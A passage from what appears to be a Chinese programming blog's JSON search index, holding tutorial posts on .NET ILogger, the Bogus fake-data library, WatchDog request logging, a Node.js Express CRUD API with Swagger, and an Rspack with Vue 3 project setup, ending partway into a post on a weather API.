只能手动将异常信息转换为字符串，然后输出。\n总结：\nILogger 提供了更丰富的日志记录功能，包括日志级别、可配置性、结构化日志支持以及与框架的良好集成。 Console.WriteLine 更简单易用，适用于快速原型开发或简单的日志记录需求。 在大多数情况下，对于生产环境中的应用程序，推荐使用 ILogger，因为它提供了更多的灵活性和控制能力。\n","permalink":"https://qfsyso.github.io/posts/.net-ilogger/","summary":"ILogger 是 ASP.NET Core 中的一个接口，用于记录应用程序的日志信息。它是一个泛型接口，其中 T 是日志记录的上下文类型。通常情况下，会使用 ILogger 接口而不是 ILogger，除非需要将特定的上下文类型传递给日志记录器。\nILogger 的示例：\n1. 注入 ILogger 在的控制器、服务或其他依赖注入组件中，可以注入 ILogger 或 ILogger。例如，在控制器中注入 ILogger：\npublic class YourController : ControllerBase { private readonly ILogger\u0026lt;YourController\u0026gt; _logger; public YourController(ILogger\u0026lt;YourController\u0026gt; logger) { _logger = logger; } // ... } 或者，如果不需要特定的上下文类型，可以注入 ILogger：\npublic class YourService { private readonly ILogger _logger; public YourService(ILogger logger) { _logger = logger; } // ... } 2. 记录日志 使用 _logger 对象记录不同级别的日志，例如：\n_logger.LogInformation(\u0026#34;This is an information message.","title":".NET ILogger"},{"content":"Bogus 快速生成模拟数据 适用于单元测试、原型设计、演示数据准备。\n1.NuGet 安装 Bogus 2.简单使用 var faker = new Faker(); // var faker = new Faker(\u0026#34;zh_CN\u0026#34;); ////中文 Console.WriteLine($\u0026#34;Name: {faker.Name.FullName()}\u0026#34;); Console.WriteLine($\u0026#34;Email: {faker.Internet.Email()}\u0026#34;); Console.WriteLine($\u0026#34;Phone: {faker.Phone.PhoneNumber()}\u0026#34;); Console.WriteLine($\u0026#34;Address: {faker.Address.FullAddress()}\u0026#34;); Console.WriteLine($\u0026#34;Company: {faker.Company.CompanyName()}\u0026#34;); Console.WriteLine($\u0026#34;Catch Phrase: {faker.Company.CatchPhrase()}\u0026#34;); Console.WriteLine($\u0026#34;BS: {faker.Company.Bs()}\u0026#34;); Console.WriteLine($\u0026#34;Product: {faker.Commerce.Product()}\u0026#34;); Console.WriteLine($\u0026#34;Price: {faker.Commerce.Price()}\u0026#34;); Console.WriteLine($\u0026#34;Credit Card: {faker.Finance.CreditCardNumber()}\u0026#34;); Console.WriteLine($\u0026#34;Bitcoin Address: {faker.Finance.BitcoinAddress()}\u0026#34;); Console.WriteLine($\u0026#34;User Agent: {faker.Internet.UserAgent()}\u0026#34;); Console.WriteLine($\u0026#34;Color: {faker.Commerce.Color()}\u0026#34;); Console.WriteLine($\u0026#34;Time Zone: {faker.Date.TimeZoneString()}\u0026#34;); 3.自定义类使用 public class TUser { public int Id { get; set; } public string FirstName { get; set; } public string LastName { get; set; } public string Email { get; set; } public DateTime Birth { get; set; } } //模拟数据 var faker = new Faker\u0026lt;TUser\u0026gt;().RuleFor(u =\u0026gt; u.Id, f =\u0026gt; f.Random.Int(1, 9999)) .RuleFor(u =\u0026gt; u.FirstName, f =\u0026gt; f.Name.FirstName()) .RuleFor(u =\u0026gt; u.LastName, f =\u0026gt; f.Name.LastName()) .RuleFor(u =\u0026gt; u.Email, (f, u) =\u0026gt; f.Internet.Email(u.FirstName, u.LastName)) .RuleFor(u =\u0026gt; u.Birth, f =\u0026gt; f.Date.Past(50)); TUser user = faker.Generate(); Console.WriteLine($\u0026#34;Id: {user.Id}\u0026#34;); Console.WriteLine($\u0026#34;Name: {user.FirstName} {user.LastName}\u0026#34;); Console.WriteLine($\u0026#34;Email: {user.Email}\u0026#34;); Console.WriteLine($\u0026#34;Date of Birth: {user.Birth:d}\u0026#34;); //模拟多个 List\u0026lt;TUser\u0026gt; users = faker.Generate(10);//10count foreach (var user in users) { Console.WriteLine($\u0026#34;{user.FirstName} {user.LastName} ({user.Email})\u0026#34;); } 4.复杂对象 public class TOrderItem { public string ProductName { get; set; } public int Quantity { get; set; } public decimal Price { get; set; } } public class TOrder { public int Id { get; set; } public TUser Customer { get; set; } public DateTime OrderDate { get; set; } public List\u0026lt;TOrderItem\u0026gt; Items { get; set; } public decimal TotalAmount { get; set; } } //模拟数据 var userFaker = new Faker\u0026lt;TUser\u0026gt;() .RuleFor(u =\u0026gt; u.Id, f =\u0026gt; f.Random.Int(1, 999)) .RuleFor(u =\u0026gt; u.FirstName, f =\u0026gt; f.Name.FirstName()) .RuleFor(u =\u0026gt; u.LastName, f =\u0026gt; f.Name.LastName()) .RuleFor(u =\u0026gt; u.Email, (f, u) =\u0026gt; f.Internet.Email(u.FirstName, u.LastName)); var orderItemFaker = new Faker\u0026lt;TOrderItem\u0026gt;() .RuleFor(oi =\u0026gt; oi.ProductName, f =\u0026gt; f.Commerce.ProductName()) .RuleFor(oi =\u0026gt; oi.Quantity, f =\u0026gt; f.Random.Int(1, 888)) .RuleFor(oi =\u0026gt; oi.Price, f =\u0026gt; decimal.Parse(f.Commerce.Price())); var orderFaker = new Faker\u0026lt;TOrder\u0026gt;() .RuleFor(o =\u0026gt; o.Id, f =\u0026gt; f.Random.Int(10000, 99999)) .RuleFor(o =\u0026gt; o.Customer, f =\u0026gt; userFaker.Generate()) .RuleFor(o =\u0026gt; o.OrderDate, f =\u0026gt; f.Date.Recent(30)) .RuleFor(o =\u0026gt; o.Items, f =\u0026gt; orderItemFaker.Generate(f.Random.Int(1, 5))) .RuleFor(o =\u0026gt; o.TotalAmount, (f, o) =\u0026gt; o.Items.Sum(i =\u0026gt; i.Price * i.Quantity)); TOrder order = orderFaker.Generate(); Console.WriteLine($\u0026#34;Order ID: {order.Id}\u0026#34;); Console.WriteLine($\u0026#34;Customer: {order.Customer.FirstName} {order.Customer.LastName}\u0026#34;); // Console.WriteLine($\u0026#34;Order Date: {order.OrderDate:d}\u0026#34;); Console.WriteLine(\u0026#34;Items:\u0026#34;); foreach (var item in order.Items) { Console.WriteLine($\u0026#34; {item.ProductName} - Quantity: {item.Quantity}, Price: {item.Price:C}\u0026#34;); } Console.WriteLine($\u0026#34;Total Amount: {order.TotalAmount:C}\u0026#34;); 5.seed值 确保每次生成的值相同\nvar faker = new Faker(\u0026#34;zh_CN\u0026#34;); faker.Random = new Randomizer(123);//seed 123 Console.WriteLine(faker.Name.FullName()); 6.国际化 locales\nvar fakerEs = new Faker(\u0026#34;es\u0026#34;); Console.WriteLine($\u0026#34;Spanish name: {fakerEs.Name.FullName()}\u0026#34;); var fakerDe = new Faker(\u0026#34;de\u0026#34;); Console.WriteLine($\u0026#34;German name: {fakerDe.Name.FullName()}\u0026#34;); var fakerFr = new Faker(\u0026#34;fr\u0026#34;); Console.WriteLine($\u0026#34;French name: {fakerFr.Name.FullName()}\u0026#34;); var fakerRu = new Faker(\u0026#34;zh_TW\u0026#34;); Console.WriteLine($\u0026#34;TW name: {fakerRu.Name.FullName()}\u0026#34;); var fakerJP = new Faker(\u0026#34;ja\u0026#34;); Console.WriteLine($\u0026#34;JP name: {fakerJP.Name.FullName()}\u0026#34;); 7.定义规则 .RuleSet(\u0026#34;adult\u0026#34;, set =\u0026gt; { set.RuleFor(u =\u0026gt; u.Birth, f =\u0026gt; f.Date.Past(35, DateTime.Now.AddYears(-16))); }); 用户的出生日期被限定为当前时间往前推35年到16年之间的随机日期，这样生成的用户就是35岁内的成年人。 //Born: {adultUser.Birth:d}\n","permalink":"https://qfsyso.github.io/posts/bogus-.net-fake-data/","summary":"Bogus 快速生成模拟数据 适用于单元测试、原型设计、演示数据准备。\n1.NuGet 安装 Bogus 2.简单使用 var faker = new Faker(); // var faker = new Faker(\u0026#34;zh_CN\u0026#34;); ////中文 Console.WriteLine($\u0026#34;Name: {faker.Name.FullName()}\u0026#34;); Console.WriteLine($\u0026#34;Email: {faker.Internet.Email()}\u0026#34;); Console.WriteLine($\u0026#34;Phone: {faker.Phone.PhoneNumber()}\u0026#34;); Console.WriteLine($\u0026#34;Address: {faker.Address.FullAddress()}\u0026#34;); Console.WriteLine($\u0026#34;Company: {faker.Company.CompanyName()}\u0026#34;); Console.WriteLine($\u0026#34;Catch Phrase: {faker.Company.CatchPhrase()}\u0026#34;); Console.WriteLine($\u0026#34;BS: {faker.Company.Bs()}\u0026#34;); Console.WriteLine($\u0026#34;Product: {faker.Commerce.Product()}\u0026#34;); Console.WriteLine($\u0026#34;Price: {faker.Commerce.Price()}\u0026#34;); Console.WriteLine($\u0026#34;Credit Card: {faker.Finance.CreditCardNumber()}\u0026#34;); Console.WriteLine($\u0026#34;Bitcoin Address: {faker.Finance.BitcoinAddress()}\u0026#34;); Console.WriteLine($\u0026#34;User Agent: {faker.Internet.UserAgent()}\u0026#34;); Console.WriteLine($\u0026#34;Color: {faker.Commerce.Color()}\u0026#34;); Console.WriteLine($\u0026#34;Time Zone: {faker.Date.TimeZoneString()}\u0026#34;); 3.自定义类使用 public class TUser { public int Id { get; set; } public string FirstName { get; set; } public string LastName { get; set; } public string Email { get; set; } public DateTime Birth { get; set; } } //模拟数据 var faker = new Faker\u0026lt;TUser\u0026gt;().","title":"Bogus-.NET Fake Data"},{"content":"WatchDog 是一个开源（MIT License）、免费的实时应用监控系统，它可以实时记录并查看应用中的消息、事件、HTTP 请求和响应，以及运行时捕获的异常。\n功能特点 实时日志记录：能够实时记录HTTP请求、响应以及运行时捕获的异常。 代码内日志记录：支持在代码中记录消息和事件。 日志搜索功能：支持对HTTP请求和异常日志进行搜索。 HTTP日志筛选：可根据HTTP方法和状态码筛选HTTP日志。 报警通知：支持通过邮件、短信等多种方式发送报警通知，确保能够及时得到反馈。 灵活配置：可以根据应用需求进行灵活的配置，适应不同的监控需求。 使用正则表达式黑名单 ：新增了使用正则表达式进行黑名单过滤的功能。\n工作原理 WatchDog 利用 SignalR 实现了实时监控，并使用LiteDb作为无需配置的类似MongoDB的服务器端数据库，同时也支持使用外部数据库（如MSSQL、MySQL、PostgreSQL、MongoDB）。\n使用 WatchDog 首先，在项目中安装 WatchDog 包。\nNuGet 包管理器中安装： dotnet add package WatchDog 在 Startup.cs 中配置 WatchDog： 在 ConfigureServices 方法中添加 WatchDog：\npublic void ConfigureServices(IServiceCollection services) { services.AddControllers(); // 添加 WatchDog 服务 services.AddWatchDogServices(); } 然后，在 Configure 方法中配置它：\npublic void Configure(IApplicationBuilder app, IWebHostEnvironment env) { if (env.IsDevelopment()) { app.UseDeveloperExceptionPage(); } app.UseHttpsRedirection(); app.UseRouting(); app.UseAuthorization(); app.UseEndpoints(endpoints =\u0026gt; { endpoints.MapControllers(); }); // 配置 WatchDog 中间件，指定 API 日志查看的访问路径和安全选项 app.UseWatchDog(opt =\u0026gt; { opt.WatchPageUsername = \u0026#34;admin\u0026#34;; // 设置用户名 opt.WatchPagePassword = \u0026#34;password\u0026#34;; // 设置密码 opt.Blacklist = new List\u0026lt;string\u0026gt; { \u0026#34;/health\u0026#34; }; // 不记录特定路径 }); } 控制器中记录日志 WatchDog 会自动记录所有 API 请求和响应，如果你想手动记录特定的事件或日志，可以使用 WatchLogger。\nusing WatchDog; [ApiController] [Route(\u0026#34;[controller]\u0026#34;)] public class SampleController : ControllerBase { [HttpGet(\u0026#34;test\u0026#34;)] public IActionResult TestEndpoint() { // 手动记录日志 WatchLogger.Log(\u0026#34;This is a manual log message\u0026#34;); return Ok(\u0026#34;Test endpoint\u0026#34;); } } 查看日志 启动应用后，打开浏览器，访问 https:///watchdog (例如，https://localhost:5001/watchdog) ，输入配置的用户名和密码即可查看日志。\n注意事项 在生产环境中使用时，请确保设置合适的访问权限以保护日志。 使用 Blacklist 配置可以避免记录不需要的路由。 这样就可以通过 WatchDog 轻松记录和查看 API 请求和响应日志。\n接口401 401 检查中间件顺序 UseWatchDog 的中间件需要在 app.UseEndpoints 或 app.MapControllers 之前添加。确保中间件的调用顺序正确，例如：\napp.UseRouting(); app.UseAuthentication(); app.UseAuthorization(); app.UseWatchDog(opt =\u0026gt; { opt.WatchPageUsername = \u0026#34;admin\u0026#34;; opt.WatchPagePassword = \u0026#34;password\u0026#34;; }); app.UseEndpoints(endpoints =\u0026gt; { endpoints.MapControllers(); }); ","permalink":"https://qfsyso.github.io/posts/.net-watchdog/","summary":"WatchDog 是一个开源（MIT License）、免费的实时应用监控系统，它可以实时记录并查看应用中的消息、事件、HTTP 请求和响应，以及运行时捕获的异常。\n功能特点 实时日志记录：能够实时记录HTTP请求、响应以及运行时捕获的异常。 代码内日志记录：支持在代码中记录消息和事件。 日志搜索功能：支持对HTTP请求和异常日志进行搜索。 HTTP日志筛选：可根据HTTP方法和状态码筛选HTTP日志。 报警通知：支持通过邮件、短信等多种方式发送报警通知，确保能够及时得到反馈。 灵活配置：可以根据应用需求进行灵活的配置，适应不同的监控需求。 使用正则表达式黑名单 ：新增了使用正则表达式进行黑名单过滤的功能。\n工作原理 WatchDog 利用 SignalR 实现了实时监控，并使用LiteDb作为无需配置的类似MongoDB的服务器端数据库，同时也支持使用外部数据库（如MSSQL、MySQL、PostgreSQL、MongoDB）。\n使用 WatchDog 首先，在项目中安装 WatchDog 包。\nNuGet 包管理器中安装： dotnet add package WatchDog 在 Startup.cs 中配置 WatchDog： 在 ConfigureServices 方法中添加 WatchDog：\npublic void ConfigureServices(IServiceCollection services) { services.AddControllers(); // 添加 WatchDog 服务 services.AddWatchDogServices(); } 然后，在 Configure 方法中配置它：\npublic void Configure(IApplicationBuilder app, IWebHostEnvironment env) { if (env.IsDevelopment()) { app.UseDeveloperExceptionPage(); } app.UseHttpsRedirection(); app.UseRouting(); app.UseAuthorization(); app.UseEndpoints(endpoints =\u0026gt; { endpoints.","title":".NET WatchDog"},{"content":"Node.js 和 Swagger 创建简单增删改查 (CRUD) API ， 使用 Express 作为 Web 框架，并集成 Swagger UI 来自动生成 API 文档。\nmkdir node-swagger-crud cd node-swagger-crud npm init -y npm install express swagger-jsdoc swagger-ui-express 2: 设置 Express 应用 创建一个文件 app.js，用于定义 Express 应用及基本路由。\n// app.js const express = require(\u0026#34;express\u0026#34;); const app = express(); app.use(express.json()); // 解析 JSON 请求 const swaggerJsDoc = require(\u0026#34;swagger-jsdoc\u0026#34;); const swaggerUi = require(\u0026#34;swagger-ui-express\u0026#34;); // Swagger 配置 const swaggerOptions = { swaggerDefinition: { openapi: \u0026#34;3.0.0\u0026#34;, info: { title: \u0026#34;Simple CRUD API\u0026#34;, version: \u0026#34;1.0.0\u0026#34;, description: \u0026#34;A simple CRUD API with Swagger documentation\u0026#34;, }, }, apis: [\u0026#34;./routes/*.js\u0026#34;], }; const swaggerDocs = swaggerJsDoc(swaggerOptions); app.use(\u0026#34;/api-docs\u0026#34;, swaggerUi.serve, swaggerUi.setup(swaggerDocs)); // 引入 CRUD 路由 const itemsRouter = require(\u0026#34;./routes/items\u0026#34;); app.use(\u0026#34;/api/items\u0026#34;, itemsRouter); const PORT = process.env.PORT || 3000; app.listen(PORT, () =\u0026gt; { console.log(`Server running on http://localhost:${PORT}`); console.log(`Swagger docs available on http://localhost:${PORT}/api-docs`); }); 3: 创建 CRUD 路由 在项目根目录下创建 routes 文件夹，并在其中创建 items.js 文件，定义 CRUD 操作接口。\n// routes/items.js const express = require(\u0026#34;express\u0026#34;); const router = express.Router(); let items = []; // 模拟数据库中的数据 /** * @swagger * components: * schemas: * Item: * type: object * required: * - name * properties: * id: * type: integer * description: The auto-generated id of the item * name: * type: string * description: The name of the item * example: * id: 1 * name: Sample Item */ /** * @swagger * /api/items: * get: * summary: 获取所有 items * tags = [\u0026#34; [Items] * responses: * 200: * description: The list of items * content: * application/json: * schema: * type: array * items: * $ref: \u0026#39;#/components/schemas/Item\u0026#39; */ router.get(\u0026#34;/\u0026#34;, (req, res) =\u0026gt; { res.json(items); }); /** * @swagger * /api/items/{id}: * get: * summary: 获取单个 item * tags = [\u0026#34; [Items] * parameters: * - in: path * name: id * schema: * type: integer * required: true * description: Item ID * responses: * 200: * description: Item data * content: * application/json: * schema: * $ref: \u0026#39;#/components/schemas/Item\u0026#39; * 404: * description: Item not found */ router.get(\u0026#34;/:id\u0026#34;, (req, res) =\u0026gt; { const item = items.find((i) =\u0026gt; i.id === parseInt(req.params.id)); if (!item) return res.status(404).send(\u0026#34;Item not found\u0026#34;); res.json(item); }); /** * @swagger * /api/items: * post: * summary: 创建一个新的 item * tags = [\u0026#34; [Items] * requestBody: * required: true * content: * application/json: * schema: * $ref: \u0026#39;#/components/schemas/Item\u0026#39; * responses: * 201: * description: Item created */ router.post(\u0026#34;/\u0026#34;, (req, res) =\u0026gt; { const item = { id: items.length + 1, name: req.body.name, }; items.push(item); res.status(201).json(item); }); /** * @swagger * /api/items/{id}: * put: * summary: 更新指定 ID 的 item * tags = [\u0026#34; [Items] * parameters: * - in: path * name: id * schema: * type: integer * required: true * description: Item ID * requestBody: * required: true * content: * application/json: * schema: * $ref: \u0026#39;#/components/schemas/Item\u0026#39; * responses: * 200: * description: Item updated * 404: * description: Item not found */ router.put(\u0026#34;/:id\u0026#34;, (req, res) =\u0026gt; { const item = items.find((i) =\u0026gt; i.id === parseInt(req.params.id)); if (!item) return res.status(404).send(\u0026#34;Item not found\u0026#34;); item.name = req.body.name; res.json(item); }); /** * @swagger * /api/items/{id}: * delete: * summary: 删除指定 ID 的 item * tags = [\u0026#34; [Items] * parameters: * - in: path * name: id * schema: * type: integer * required: true * description: Item ID * responses: * 200: * description: Item deleted * 404: * description: Item not found */ router.delete(\u0026#34;/:id\u0026#34;, (req, res) =\u0026gt; { const itemIndex = items.findIndex((i) =\u0026gt; i.id === parseInt(req.params.id)); if (itemIndex === -1) return res.status(404).send(\u0026#34;Item not found\u0026#34;); items.splice(itemIndex, 1); res.send(\u0026#34;Item deleted\u0026#34;); }); module.exports = router; 4: 启动服务器 node app.js 访问 http://localhost:3000/api-docs， 可以查看生成的 Swagger 文档。\n测试 API 以下是 API 接口的示例请求：\n获取所有 items: GET http://localhost:3000/api/items 获取单个 item: GET http://localhost:3000/api/items/{id} 创建 item: POST http://localhost:3000/api/items，JSON 数据 { \u0026ldquo;name\u0026rdquo;: \u0026ldquo;New Item\u0026rdquo; } 更新 item: PUT http://localhost:3000/api/items/{id}，JSON 数据 { \u0026ldquo;name\u0026rdquo;: \u0026ldquo;Updated Item\u0026rdquo; } 删除 item: DELETE http://localhost:3000/api/items/{id}\n这样，一个简单的 CRUD 接口及其文档就构建完成了！\n","permalink":"https://qfsyso.github.io/posts/node-swagger/","summary":"Node.js 和 Swagger 创建简单增删改查 (CRUD) API ， 使用 Express 作为 Web 框架，并集成 Swagger UI 来自动生成 API 文档。\nmkdir node-swagger-crud cd node-swagger-crud npm init -y npm install express swagger-jsdoc swagger-ui-express 2: 设置 Express 应用 创建一个文件 app.js，用于定义 Express 应用及基本路由。\n// app.js const express = require(\u0026#34;express\u0026#34;); const app = express(); app.use(express.json()); // 解析 JSON 请求 const swaggerJsDoc = require(\u0026#34;swagger-jsdoc\u0026#34;); const swaggerUi = require(\u0026#34;swagger-ui-express\u0026#34;); // Swagger 配置 const swaggerOptions = { swaggerDefinition: { openapi: \u0026#34;3.","title":" Node Swagger"},{"content":"Rspack+Vue3+TS 项目环境构建到实战Rspack是什么? Rspack是一个基于 Rust 编写的高性能JavaScript 打包工具，它提供对 webpack 生态良好的兼容性能够无缝替换 webpack，并提供闪电般的构建速度。\n为什么要做 Rspack 创建 Rspack 的原因，是为了解决在字节跳动维护构建工具时遇到的各种性能问题。在字节跳动内部存在许多巨石应用，它们都具有复杂的构建配置，生产环境的构建需要耗费十几分钟，甚至超过半小时;开发环境的耗时也超过十几分钟。 我们在 webpack 上尝试了多种方法来优化这些巨石应用，但是效果甚微。我们意识到在 webpack 上的优化已经难以为继，必须要从底层改造，才能适应我们的需求。 同时在聆听解决业务各种复杂的构建需求中，我们意识到开发人员对构建工具有以下要求: 快速的 Dev 启动性能 npm run dev 是开发者每天需要运行很多次的命令，但大型项目每次都需和要等待 10分钟，这对于工程师来说非常痛苦，因此优化开发模式下启动的时间至关重要 高效的 Build 性能 npm run bui1d 经常在 CI/CD 环境中运行，它决定了应用生产交付的效率,有些应用在生产环境中需要 20 到 30 分钟的构建时间，如果能缩短这段时间，对开发流程也将非 常有帮助。 灵活的配置 用户工程的配置非常灵活，不够统一。在之前的尝试中，将webpack配置迁移到其他构建工具时，我们遇到了许多问题，因为其他构建工具的配置不如 webpack 灵活。 生产环境的优化能力 在启用 Rspack之前，我们尝试了社区内的各种方案，但它们都面临着一定程度的生产环境负优化，例如拆分包不够精细等。因此，优化生产环境的产物是我们不可放弃的功能。 在确定了这四个需求后，我们调查了社区中的所有技术方案，它们通常都能很好的满足其中个别需求但没有一个方案能同时满足所有条件，因此，我们决定自研 Rspack。\n和 webpack 的区别 webpack是目前最为成熟的构建工具，有着活跃的生态，灵活的配置和丰富的功能，但是其最为人诟病的是其性能问题，尤其在一些大型项目上，构建花费的时间可能会达到几分钟甚至几十分钟，\u0026laquo;\u0026lt;性能问题是目前 webpack 最大的短板。因此 Rspack 解决的问题核心就是webpack 的性能问题。 Rspack 比webpack 快得益于如下几方面: Rust 语言优势: Rspack 使用 Rust 语言编写，得益于 Rust的高性能编译器支持， Rust 编译生成的 Native Code 通常比JavaScript 性能更为高效。 高度并行的架构: webpack 受限于JavaScript 对多线程的赢弱支持，导致其很难进行高度的并行化计算，而得益于 Rust语言的并行化的良好支持，Rspack采用了高度并行化的架构，如模块图生成，代码生成等阶段，都是采用多线程并行执行，这使得其编译性能随着 CPU核心数的增长而增长，充分挖掘 CPU的多核优势。 内置大部分的功能: 事实上 webpack 本身的性能足够高效，但是因为 webpack 本身内置了较少的功能，这使得我们在使用 webpack 做现代 Web App 开发时，通常需要配合很多的 plugin 和loader 进行使用，而这些loader和 plugin 往往是性能的瓶颈，而 Rspack 虽然支持loader 和plugin，但是保证绝大部分常用功能都内置在Rspack内，从而减小Spluginlloader 导致的低性能和通信开销问题， 增量编译: 尽管 Rspack 的全量编译足够高效，但是当项目庞大时，全量的编译仍然难以满足 HMR的性能要求，因此在 HMR 阶段，我们采用的是更为高效的增量编译策略，从而保证，无论你的项目多大，其 HMR 的开销总是控制在合理范围内。\n和 Vite 的区别 Vite提供了很好的开发者体验，但 Vite 在生产构建中依赖了 Rollup，因此与其他基于JavaScript 的工具链一样，面临着生产环境的构建性能问题。 另外，Rollup相较于 webpack做了一些平衡取舍，在这里同样适用。比如，Rollup缺失了 webpack对于拆包的灵活性，即缺失了 optimization.splitChunks提供的很多功能。\n和 esbuild 的区别 我们在内部进行过大规模地将 esbuild作为通用的 Web App 构建工具的实践，但是遇到如下一些问题:缺乏对 JavaScript HMR 和增量编译的良好支持，这导致大型项目中的 HMR 性能较差。拆包策略也非常原始，难以满足业务复杂多变的拆包优化需求。\nRspack快速上手 环境准备 在开始使用前， 需要安装 Node.js\u0026gt;=16 版本，推荐使用 Node,js LTS 版本\nnode -v 创建新项目\n使用 Rsbuild Rsbuip 是由 Rspack 驱动的高性能构建工具，由 Rspack 团队开发，它默认包含了一套精心设计的构建配置，提供开箱即用的开发体验，并能够充分发挥出 Rspack的性能优势。\n我们推荐使用 Rsbuild来创建新项目，执行如下命令即可:\nnpm create rsbuild@latest 或者\nyarn create rsbuild 或者\npnpm create rsbuildalatest 或者\nbun create rsbuildalatest ◇ Project name or path │ test │ ◇ Select framework │ Vue 3 │ ◇ Select language │ TypeScript │ ◇ Select additional tools (Use \u0026lt;space\u0026gt; to select, \u0026lt;enter\u0026gt; to continue) (enter) │ none │◇ Next steps ──╮ │ │ │ cd test │ │ npm install │ │ npm run dev\t│ │ │ npm run build package.json\n\u0026#34;scripts\u0026#34;: { \u0026#34;ast\u0026#34;: \u0026#34;rsbuild dev --open\u0026#34;} npm run ast\ndependencies 生产 devDependencies 安装\nrsbuild.config.ts\nexport default defineConfig({ plugins: [pluginVue()], server:{ port:8116,//开发服务器端口 open:true,//是否自动打开浏览器 proxy:{//代理设置 } } }); tsconfig.json\n\u0026#34;target\u0026#34;: \u0026#34;ES2020\u0026#34;, 编译的js版本 \u0026#34;include\u0026#34;: [\u0026#34;src\u0026#34;] 包含目录 安装element-plus npm install element-plus -s 或者\nyarn add element-plus 或者\npnpm insta1l element-plus index.ts\nimport{createApp}from \u0026#34;vue\u0026#34;; import ElementPlus from\u0026#34;element-plus\u0026#34; import \u0026#34;element-plus/dist/index.css\u0026#34; import App from \u0026#34;./App.vue\u0026#34;; import\u0026#39;/index.css\u0026#39;; createApp(App).use(ElementPlus).mount(\u0026#39;#root\u0026#39;); .vue使用即可\n配置路由 vue-router\nnpm install vue-router src-router-index.ts const router = CreateRouter()\nindex.ts add rout import router from \u0026ldquo;./router\u0026rdquo;;\nVue3 路由守卫 i18n import i18n from \u0026#39;@/languages/index\u0026#39; const titleKey = to.meta.title?.toString() || globalStore.title //console.log(titleKey) //route. const tttemp = i18n.global.t(`${titleKey}`) //console.log(tttemp) document.title = tttemp//i18n.global.t(`${titleKey}`) // 使用i18n转换标题 {{ t(item.title) }} import { useI18n } from \u0026#39;vue-i18n\u0026#39; // 确保已导入i18n const { t } = useI18n() // 获取翻译函数 添加对应的翻译键\n组件内\n修改模板代码 将静态文本替换为国际化函数 t()，并绑定语言包中的键：\n\u0026lt;el-form-item :label=\u0026#34;t(\u0026#39;Reason\u0026#39;)\u0026#34; style=\u0026#34;width: 84%\u0026#34;\u0026gt; \u0026lt;el-input v-model=\u0026#34;formData.com\u0026#34; /\u0026gt; \u0026lt;/el-form-item\u0026gt; \u0026lt;el-form-item :label=\u0026#34;t(\u0026#39;IP\u0026#39;)\u0026#34; style=\u0026#34;width: 84%\u0026#34;\u0026gt; \u0026lt;el-input v-model=\u0026#34;formData.ip\u0026#34; /\u0026gt; \u0026lt;/el-form-item\u0026gt; 组件中启用国际化 确保在组件脚本中引入 useI18n 并初始化：\n\u0026lt;script setup lang=\u0026#34;ts\u0026#34;\u0026gt; import { useI18n } from \u0026#39;vue-i18n\u0026#39;; const { t } = useI18n(); // 其他逻辑... \u0026lt;/script\u0026gt; 优化布局稳定性 若发现切换语言时表单布局抖动（浏览器重排），可为 label 设置固定宽度或占位符，避免 v-if 导致的渲染延迟。例如：\n\u0026lt;el-form-item :label=\u0026#34;t(\u0026#39;Reason\u0026#39;) || \u0026#39;　\u0026#39;\u0026#34; label-width=\u0026#34;120px\u0026#34;\u0026gt; \u0026lt;!-- 内容 --\u0026gt; \u0026lt;/el-form-item\u0026gt; ","permalink":"https://qfsyso.github.io/posts/rspack-vue3/","summary":"Rspack+Vue3+TS 项目环境构建到实战Rspack是什么? Rspack是一个基于 Rust 编写的高性能JavaScript 打包工具，它提供对 webpack 生态良好的兼容性能够无缝替换 webpack，并提供闪电般的构建速度。\n为什么要做 Rspack 创建 Rspack 的原因，是为了解决在字节跳动维护构建工具时遇到的各种性能问题。在字节跳动内部存在许多巨石应用，它们都具有复杂的构建配置，生产环境的构建需要耗费十几分钟，甚至超过半小时;开发环境的耗时也超过十几分钟。 我们在 webpack 上尝试了多种方法来优化这些巨石应用，但是效果甚微。我们意识到在 webpack 上的优化已经难以为继，必须要从底层改造，才能适应我们的需求。 同时在聆听解决业务各种复杂的构建需求中，我们意识到开发人员对构建工具有以下要求: 快速的 Dev 启动性能 npm run dev 是开发者每天需要运行很多次的命令，但大型项目每次都需和要等待 10分钟，这对于工程师来说非常痛苦，因此优化开发模式下启动的时间至关重要 高效的 Build 性能 npm run bui1d 经常在 CI/CD 环境中运行，它决定了应用生产交付的效率,有些应用在生产环境中需要 20 到 30 分钟的构建时间，如果能缩短这段时间，对开发流程也将非 常有帮助。 灵活的配置 用户工程的配置非常灵活，不够统一。在之前的尝试中，将webpack配置迁移到其他构建工具时，我们遇到了许多问题，因为其他构建工具的配置不如 webpack 灵活。 生产环境的优化能力 在启用 Rspack之前，我们尝试了社区内的各种方案，但它们都面临着一定程度的生产环境负优化，例如拆分包不够精细等。因此，优化生产环境的产物是我们不可放弃的功能。 在确定了这四个需求后，我们调查了社区中的所有技术方案，它们通常都能很好的满足其中个别需求但没有一个方案能同时满足所有条件，因此，我们决定自研 Rspack。\n和 webpack 的区别 webpack是目前最为成熟的构建工具，有着活跃的生态，灵活的配置和丰富的功能，但是其最为人诟病的是其性能问题，尤其在一些大型项目上，构建花费的时间可能会达到几分钟甚至几十分钟，\u0026laquo;\u0026lt;性能问题是目前 webpack 最大的短板。因此 Rspack 解决的问题核心就是webpack 的性能问题。 Rspack 比webpack 快得益于如下几方面: Rust 语言优势: Rspack 使用 Rust 语言编写，得益于 Rust的高性能编译器支持， Rust 编译生成的 Native Code 通常比JavaScript 性能更为高效。 高度并行的架构: webpack 受限于JavaScript 对多线程的赢弱支持，导致其很难进行高度的并行化计算，而得益于 Rust语言的并行化的良好支持，Rspack采用了高度并行化的架构，如模块图生成，代码生成等阶段，都是采用多线程并行执行，这使得其编译性能随着 CPU核心数的增长而增长，充分挖掘 CPU的多核优势。 内置大部分的功能: 事实上 webpack 本身的性能足够高效，但是因为 webpack 本身内置了较少的功能，这使得我们在使用 webpack 做现代 Web App 开发时，通常需要配合很多的 plugin 和loader 进行使用，而这些loader和 plugin 往往是性能的瓶颈，而 Rspack 虽然支持loader 和plugin，但是保证绝大部分常用功能都内置在Rspack内，从而减小Spluginlloader 导致的低性能和通信开销问题， 增量编译: 尽管 Rspack 的全量编译足够高效，但是当项目庞大时，全量的编译仍然难以满足 HMR的性能要求，因此在 HMR 阶段，我们采用的是更为高效的增量编译策略，从而保证，无论你的项目多大，其 HMR 的开销总是控制在合理范围内。","title":"Rspack Vue3"},{"content":"通过当前网络IP获取天气~\n获取天气的接口 地址： https://weather.sl.al/\n参数： https://weather.sl.al/?lat=22.2783\u0026amp;lon=114.1747\n\u0026amp;lang=en\nlat：纬度\nlon：经度\nlang：语言\n(默认不带 lang 的话为中文)\n{ 